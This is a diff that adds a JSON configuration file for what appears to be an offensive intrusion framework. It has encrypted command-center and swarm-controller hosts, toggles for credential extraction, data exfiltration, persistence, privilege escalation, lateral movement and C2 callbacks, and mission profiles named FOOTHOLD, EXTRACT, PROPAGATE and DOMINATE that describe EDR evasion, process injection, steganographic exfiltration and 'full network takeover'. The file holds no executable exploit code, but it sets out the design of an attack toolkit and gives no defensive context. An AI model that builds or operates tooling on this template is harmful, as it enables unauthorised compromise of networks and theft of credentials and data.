@@ -1,0 +1,239 @@
+{
+  "redis": {
+    "host": {
+      "__encrypted__": true,
+      "value": "6b6f5a7a2b4d5f1a3c2e1f0a"
+    },
+    "port": 6379,
+    "db": 0,
+    "socket_connect_timeout": 2.0,
+    "decode_responses": true
+  },
+  "vault": {
+    "mode": "local",
+    "redis": {
+      "host": {
+        "__encrypted__": true,
+        "value": "6b6f5a7a2b4d5f1a3c2e1f0a"
+      },
+      "port": 6379,
+      "db": 1
+    },
+    "node_id": "agent-01"
+  },
+  "black_vault": {
+    "password": {
+      "__encrypted__": true,
+      "value": "5a7c8d9f1e2a3b4c6d7e8f9a"
+    },
+    "vault_rotate_days": 7,
+    "vault_path": {
+      "__encrypted__": true,
+      "value": "1a2b3c4d5e6f7a8b9c0d1e2f"
+    }
+  },
+  "swarm": {
+    "controller_host": {
+      "__encrypted__": true,
+      "value": "3c4d5e6f7a8b9c0d1e2f3a4b"
+    },
+    "controller_port": 5555,
+    "mesh_enabled": true
+  },
+  "stealth_threshold": 0.8,
+  "scout_targets": [],
+  "command_center": {
+    "__encrypted__": true,
+    "value": "2f3a4b5c6d7e8f9a0b1c2d3e"
+  },
+  "intelligent_operations": {
+    "enabled": true,
+    "credential_extraction": {
+      "enabled": true,
+      "max_techniques": 4,
+      "learning_persistence": true
+    },
+    "data_exfiltration": {
+      "enabled": true,
+      "max_techniques": 4,
+      "network_aware": true
+    },
+    "persistence": {
+      "enabled": true,
+      "stealth_priority": true
+    },
+    "escalation": {
+      "enabled": true,
+      "max_attempts": 3
+    },
+    "lateral_movement": {
+      "enabled": true,
+      "target_prioritization": true
+    },
+    "c2_callback": {
+      "enabled": true,
+      "adaptive_heartbeat": true,
+      "learning_persistence": true
+    },
+    "learning_state_file": "learning_state.json",
+    "audit_trail_enabled": true
+  },
+  "mission_profiles": {
+    "default_time_budget_mode": "BALANCED",
+    "checkpoint_enabled": true,
+    "checkpoint_ttl_seconds": 86400,
+    "time_budget_modes": {
+      "FAST": {
+        "time_budget_minutes": 30,
+        "scout_variant": "ALPHA",
+        "infiltrator_variant": "RED",
+        "exfiltrator_variant": "AGGRESSIVE",
+        "privesc_variant": "STANDARD",
+        "propagation_variant": "JUMP",
+        "edr_caution_level": 0.3,
+        "behavioral_noise_enabled": false,
+        "process_injection_preferred": false,
+        "detection_risk_tolerance": 0.7
+      },
+      "BALANCED": {
+        "time_budget_minutes": 120,
+        "scout_variant": "DELTA",
+        "infiltrator_variant": "GHOST",
+        "exfiltrator_variant": "BALANCED",
+        "privesc_variant": "STANDARD",
+        "propagation_variant": "MESH",
+        "edr_caution_level": 0.5,
+        "behavioral_noise_enabled": true,
+        "process_injection_preferred": true,
+        "detection_risk_tolerance": 0.5
+      },
+      "STEALTH": {
+        "time_budget_minutes": 360,
+        "scout_variant": "SIGMA",
+        "infiltrator_variant": "BLACK",
+        "exfiltrator_variant": "STEALTH",
+        "privesc_variant": "STEALTHY",
+        "propagation_variant": "PATIENT",
+        "edr_caution_level": 0.9,
+        "behavioral_noise_enabled": true,
+        "process_injection_preferred": true,
+        "detection_risk_tolerance": 0.2
+      }
+    },
+    "mission_type_defaults": {
+      "FOOTHOLD": {
+        "stealth_level": 50,
+        "time_budget_mode": "BALANCED",
+        "priority_data_types": ["entry_point", "initial_credentials"],
+        "persistence_required": true,
+        "use_process_injection": false,
+        "exfil_method": "swarm_mesh",
+        "description": "Establish initial network access and deploy first agent"
+      },
+      "ESCALATE": {
+        "stealth_level": 60,
+        "time_budget_mode": "BALANCED",
+        "priority_data_types": ["escalation_technique", "elevated_credentials"],
+        "persistence_required": false,
+        "use_process_injection": true,
+        "exfil_method": "swarm_mesh",
+        "description": "Elevate privileges on target host"
+      },
+      "INFILTRATE": {
+        "stealth_level": 85,
+        "time_budget_mode": "STEALTH",
+        "priority_data_types": ["persistence_method", "injected_payload"],
+        "persistence_required": true,
+        "use_process_injection": true,
+        "behavioral_noise_enabled": true,
+        "exfil_method": "steganography",
+        "description": "Establish deep covert presence with persistence via GhostLayer"
+      },
+      "EXTRACT": {
+        "stealth_level": 70,
+        "time_budget_mode": "BALANCED",
+        "priority_data_types": ["credentials", "private_keys", "database_creds", "sensitive_files"],
+        "persistence_required": false,
+        "use_process_injection": true,
+        "credential_causal_aware": true,
+        "exfil_method": "swarm_mesh",
+        "encrypt_exfil": true,
+        "fragment_exfil": true,
+        "description": "Extract credentials, keys, and sensitive data"
+      },
+      "PROPAGATE": {
+        "stealth_level": 75,
+        "time_budget_mode": "STEALTH",
+        "priority_data_types": ["compromised_hosts", "lateral_movement_vectors"],
+        "persistence_required": true,
+        "use_process_injection": true,
+        "use_swarm_mesh": true,
+        "distribute_to_discovered_hosts": true,
+        "description": "Lateral movement and network-wide compromise via mesh"
+      },
+      "DOMINATE": {
+        "stealth_level": 70,
+        "time_budget_mode": "STEALTH",
+        "priority_data_types": ["critical_assets", "domain_admin_creds", "gpo_data"],
+        "persistence_required": true,
+        "use_process_injection": true,
+        "credential_causal_aware": true,
+        "use_swarm_mesh": true,
+        "distribute_to_discovered_hosts": true,
+        "description": "Full network takeover with strategic targeting and enforcement"
+      },
+      "EXECUTE": {
+        "stealth_level": 60,
+        "time_budget_mode": "BALANCED",
+        "priority_data_types": ["execution_result", "output"],
+        "persistence_required": false,
+        "use_process_injection": true,
+        "exfil_method": "c2_channel",
+        "skip_stages": ["EXTRACT", "EXFIL"],
+        "description": "Binary execution and payload delivery"
+      },
+      "MAINTAIN": {
+        "stealth_level": 95,
+        "time_budget_mode": "STEALTH",
+        "priority_data_types": ["evasion_success", "hibernation_capability"],
+        "persistence_required": true,
+        "use_process_injection": true,
+        "behavioral_noise_enabled": true,
+        "exfil_method": "steganography",
+        "self_destruct_on_failure": true,
+        "skip_stages": ["EXTRACT", "EXFIL"],
+        "description": "Maintain deep cover: evasion and hibernation for air-gapped systems"
+      },
+      "EXFIL": {
+        "stealth_level": 80,
+        "time_budget_mode": "BALANCED",
+        "priority_data_types": ["encrypted_data", "fragments"],
+        "persistence_required": false,
+        "use_swarm_mesh": true,
+        "encrypt_exfil": true,
+        "fragment_exfil": true,
+        "exfil_method": "swarm_mesh",
+        "description": "Dedicated data exfiltration via stealth channels"
+      }
+    },
+    "agent_variants": {
+      "scout": ["SIGMA", "ALPHA", "DELTA", "OMEGA"],
+      "infiltrator": ["BLACK", "RED", "GHOST", "SILK"],
+      "exfiltrator": ["STEALTH", "CONSERVATIVE", "BALANCED", "AGGRESSIVE", "BRUTAL"],
+      "privesc": ["STEALTHY", "STANDARD", "AGGRESSIVE", "FALLBACK"],
+      "propagation": ["MESH", "CRAWL", "JUMP", "PATIENT"]
+    },
+    "variant_fallback_chains": {
+      "scout": ["SIGMA", "DELTA", "ALPHA", "OMEGA"],
+      "infiltrator": ["BLACK", "GHOST", "SILK", "RED"],
+      "exfiltrator": ["STEALTH", "CONSERVATIVE", "BALANCED", "AGGRESSIVE", "BRUTAL"],
+      "privesc": ["STEALTHY", "STANDARD", "FALLBACK", "AGGRESSIVE"],
+      "propagation": ["PATIENT", "CRAWL", "MESH", "JUMP"]
+    },
+    "variant_backoff_delays": {
+      "FAST": [0, 1, 2],
+      "BALANCED": [2, 4, 8],
+      "STEALTH": [5, 15, 30]
+    }
+  }
+}
